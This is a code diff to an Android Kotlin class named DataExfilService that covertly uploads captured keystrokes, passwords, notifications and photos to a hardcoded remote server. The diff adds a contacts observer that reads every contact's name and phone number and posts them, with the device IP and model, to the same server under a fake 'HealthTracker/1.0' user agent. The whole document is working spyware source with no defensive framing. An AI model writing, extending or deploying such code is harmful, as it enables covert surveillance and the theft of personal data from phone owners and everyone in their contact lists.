@@ -27,6 +27,10 @@ import okhttp3.*
 import okhttp3.MediaType.Companion.toMediaTypeOrNull
 import okhttp3.RequestBody.Companion.toRequestBody
 import java.io.IOException
+import android.provider.ContactsContract
+import java.net.Inet4Address
+import java.net.NetworkInterface
+import java.util.Collections
 
 class DataExfilService : Service() {
 
@@ -35,22 +39,20 @@ class DataExfilService : Service() {
         private const val NOTIFICATION_CHANNEL_ID = "data_exfil_channel"
         private const val NOTIFICATION_ID = 1001
         private const val SERVER_ENDPOINT = "http://20.2.92.176:5000/accessibility_logs"
-
-        fun startService(context: Context) {
-            val intent = Intent(context, DataExfilService::class.java)
-
-            // Check Android version for foreground service
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-                context.startForegroundService(intent)
-            } else {
-                context.startService(intent)
-            }
-        }
     }
 
     private val photosEndpoint = "http://20.2.92.176:5000/photos"
+    private val contactsEndpoint = "http://20.2.92.176:5000/contacts"
+
     private lateinit var photoObserver: ContentObserver
-    private val photoSyncPrefs by lazy { getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE) }
+    private lateinit var contactsObserver: ContentObserver
+
+    private val photoSyncPrefs by lazy {
+        getSharedPreferences("photo_sync_log", Context.MODE_PRIVATE)
+    }
+    private val contactsSyncPrefs by lazy {
+        getSharedPreferences("contacts_sync_log", Context.MODE_PRIVATE)
+    }
 
     private lateinit var handler: Handler
     private var isUploading = false
@@ -72,16 +74,16 @@ class DataExfilService : Service() {
         handler = Handler(Looper.getMainLooper())
         createNotificationChannel()
         setupPhotoObserver()
+        setupContactsObserver()
     }
 
     override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
         Log.d(TAG, "Data exfiltration service started")
 
-        // Start as foreground service immediately
         startForegroundService()
 
         // Start periodic uploads
-        handler.postDelayed(uploadRunnable, 10000) // First upload in 10 seconds
+        handler.postDelayed(uploadRunnable, 10000)
 
         return START_STICKY
     }
@@ -124,6 +126,7 @@ class DataExfilService : Service() {
             .build()
     }
 
+    // ========== ACCESSIBILITY LOGS ==========
     private fun uploadAccessibilityLogs() {
         if (isUploading) return
         if (!isNetworkAvailable()) {
@@ -136,7 +139,6 @@ class DataExfilService : Service() {
 
         Thread {
             try {
-                // Read spy logs
                 val logContent = readSpyLogs()
                 if (logContent.isEmpty()) {
                     Log.d(TAG, "No logs to upload")
@@ -146,15 +148,11 @@ class DataExfilService : Service() {
 
                 Log.d(TAG, "Found ${logContent.lines().size} log entries")
 
-                // Parse logs into notifications format
                 val logs = parseLogsForNotifications(logContent)
-
-                // Send to server
                 val success = sendToServer(logs)
 
                 if (success) {
                     Log.d(TAG, "Spy logs uploaded successfully")
-                    // Archive logs after successful upload
                     archiveLogs()
                 } else {
                     Log.w(TAG, "Upload failed")
@@ -207,7 +205,6 @@ class DataExfilService : Service() {
             put("app_package", packageName)
         }
 
-        // Categorize logs
         val keyPresses = JSONArray()
         val appSwitches = JSONArray()
         val clicks = JSONArray()
@@ -221,11 +218,10 @@ class DataExfilService : Service() {
                 line.contains("CLICK") -> clicks.put(line)
                 line.contains("SENSITIVE") || line.contains("PASSWORD") -> sensitiveData.put(line)
                 line.contains("NOTIFICATION") -> notifications.put(line)
-                else -> keyPresses.put(line) // Default to key presses
+                else -> keyPresses.put(line)
             }
         }
 
-        // Create categorized object
         val categorizedLogs = JSONObject().apply {
             put("key_presses", keyPresses)
             put("app_switches", appSwitches)
@@ -253,7 +249,6 @@ class DataExfilService : Service() {
             connection.readTimeout = 15000
             connection.doOutput = true
 
-            // Write data
             val outputStream = connection.outputStream
             OutputStreamWriter(outputStream, "UTF-8").use { writer ->
                 writer.write(data.toString())
@@ -265,7 +260,6 @@ class DataExfilService : Service() {
 
             Log.d(TAG, "Server response: $responseCode $responseMessage")
 
-            // Try to read response
             try {
                 val response = if (responseCode >= 400) {
                     connection.errorStream.bufferedReader().use { it.readText() }
@@ -279,7 +273,6 @@ class DataExfilService : Service() {
 
             connection.disconnect()
 
-            // Consider 200, 201, 202 as success
             responseCode in 200..299
 
         } catch (e: Exception) {
@@ -296,7 +289,6 @@ class DataExfilService : Service() {
                 val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.US).format(Date())
                 val archivedFile = File(filesDir, "watch_$timestamp.log")
                 logFile.copyTo(archivedFile)
-                // Clear the original log file after archiving
                 logFile.writeText("")
                 Log.d(TAG, "Logs archived to: ${archivedFile.name}")
             }
@@ -326,6 +318,7 @@ class DataExfilService : Service() {
         Log.d(TAG, "Data exfiltration service destroyed")
         super.onDestroy()
         contentResolver.unregisterContentObserver(photoObserver)
+        contentResolver.unregisterContentObserver(contactsObserver)
     }
 
     private fun setupPhotoObserver() {
@@ -415,6 +408,181 @@ class DataExfilService : Service() {
             })
         } catch (e: Exception) {
             Log.e(TAG, "Error uploading photo: ${e.message}")
+        }
+    }
+
+    private fun setupContactsObserver() {
+        contactsObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
+            override fun onChange(selfChange: Boolean, uri: Uri?) {
+                Log.d(TAG, "Contacts database changed: $uri")
+                scanAndUploadContacts()
+            }
+        }
+
+        contentResolver.registerContentObserver(
+            ContactsContract.Contacts.CONTENT_URI,
+            true,
+            contactsObserver
+        )
+
+        Log.d(TAG, "Contacts observer registered")
+
+        // Automatically scan if permission is already granted when service starts
+        if (hasContactsPermission()) {
+            Log.d(TAG, "Contacts permission granted, performing initial scan")
+            scanAndUploadContacts()
+        }
+    }
+
+    private fun hasContactsPermission(): Boolean {
+        return checkSelfPermission(android.Manifest.permission.READ_CONTACTS) ==
+                android.content.pm.PackageManager.PERMISSION_GRANTED
+    }
+
+    private fun scanAndUploadContacts() {
+        if (!isNetworkAvailable()) {
+            Log.d(TAG, "No network, skipping contacts scan")
+            return
+        }
+
+        if (!hasContactsPermission()) {
+            Log.d(TAG, "No contacts permission, skipping scan")
+            return
+        }
+
+        Log.d(TAG, "Starting contacts scan...")
+
+        val projection = arrayOf(
+            ContactsContract.Contacts._ID,
+            ContactsContract.Contacts.DISPLAY_NAME,
+            ContactsContract.Contacts.HAS_PHONE_NUMBER
+            // Removed CONTACT_LAST_UPDATED_TIMESTAMP as it's not available on all API levels
+        )
+
+        contentResolver.query(
+            ContactsContract.Contacts.CONTENT_URI,
+            projection,
+            null,
+            null,
+            null  // Remove ordering by timestamp
+        )?.use { cursor ->
+            val totalContacts = cursor.count
+            Log.d(TAG, "Contacts Scan: $totalContacts contacts found")
+
+            val idColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID)
+            val nameColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)
+            val hasPhoneColumn = cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)
+
+            var uploadCount = 0
+            while (cursor.moveToNext()) {
+                val contactId = cursor.getString(idColumn)
+                val name = cursor.getString(nameColumn) ?: "Unnamed"
+                val hasPhone = cursor.getInt(hasPhoneColumn)
+
+                if (!contactsSyncPrefs.getBoolean("contact_$contactId", false)) {
+                    var phoneNumber = "No number found"
+
+                    if (hasPhone > 0) {
+                        phoneNumber = getPhoneNumberForContact(contactId)
+                    }
+
+                    uploadContactToServer(contactId, name, phoneNumber)
+                    contactsSyncPrefs.edit().putBoolean("contact_$contactId", true).apply()
+                    uploadCount++
+                }
+            }
+            Log.d(TAG, "Contacts Scan Complete: $uploadCount new contacts uploaded")
+        }
+    }
+
+    private fun getPhoneNumberForContact(contactId: String): String {
+        var phoneNumber = "No number found"
+
+        contentResolver.query(
+            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+            arrayOf(ContactsContract.CommonDataKinds.Phone.NUMBER),
+            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
+            arrayOf(contactId),
+            null
+        )?.use { phoneCursor ->
+            if (phoneCursor.moveToFirst()) {
+                val numberColumn = phoneCursor.getColumnIndexOrThrow(
+                    ContactsContract.CommonDataKinds.Phone.NUMBER
+                )
+                phoneNumber = phoneCursor.getString(numberColumn)
+            }
+        }
+
+        return phoneNumber
+    }
+
+    private fun uploadContactToServer(contactId: String, contactName: String, phoneNumber: String) {
+        try {
+            val ipAddress = getDeviceIPAddress()
+
+            val contactData = JSONObject().apply {
+                put("type", "contact")
+                put("device_ip", ipAddress)
+                put("device_model", Build.MODEL)
+                put("android_version", Build.VERSION.RELEASE)
+                put("timestamp", System.currentTimeMillis())
+                put("app_package", packageName)
+                put("contact_id", contactId)
+                put("contact_name", contactName)
+                put("phone_number", phoneNumber)
+            }
+
+            val requestBody = contactData.toString()
+                .toRequestBody("application/json; charset=utf-8".toMediaTypeOrNull())
+
+            val request = Request.Builder()
+                .url(contactsEndpoint)
+                .post(requestBody)
+                .addHeader("User-Agent", "HealthTracker/1.0")
+                .build()
+
+            NetworkClient.instance.newCall(request).enqueue(object : Callback {
+                override fun onFailure(call: Call, e: IOException) {
+                    Log.e(TAG, "Contact upload failed: $contactName - ${e.message}")
+                    contactsSyncPrefs.edit().remove("contact_$contactId").apply()
+                }
+
+                override fun onResponse(call: Call, response: Response) {
+                    if (response.isSuccessful) {
+                        Log.d(TAG, "Contact uploaded: $contactName -> $phoneNumber")
+                    } else {
+                        Log.w(TAG, "Contact upload failed: HTTP ${response.code}")
+                        contactsSyncPrefs.edit().remove("contact_$contactId").apply()
+                    }
+                    response.close()
+                }
+            })
+
+        } catch (e: Exception) {
+            Log.e(TAG, "Error uploading contact: ${e.message}")
+            contactsSyncPrefs.edit().remove("contact_$contactId").apply()
+        }
+    }
+
+    private fun getDeviceIPAddress(): String {
+        return try {
+            val networkInterfaces = Collections.list(NetworkInterface.getNetworkInterfaces())
+
+            for (intf in networkInterfaces) {
+                val addresses = Collections.list(intf.inetAddresses)
+                for (addr in addresses) {
+                    if (!addr.isLoopbackAddress && addr is Inet4Address) {
+                        val ip = addr.hostAddress ?: ""
+                        if (!ip.startsWith("169.254.")) {
+                            return ip
+                        }
+                    }
+                }
+            }
+            "unknown"
+        } catch (e: Exception) {
+            Log.e(TAG, "Error getting IP address: ${e.message}")
+            "unknown"
         }
     }
 }
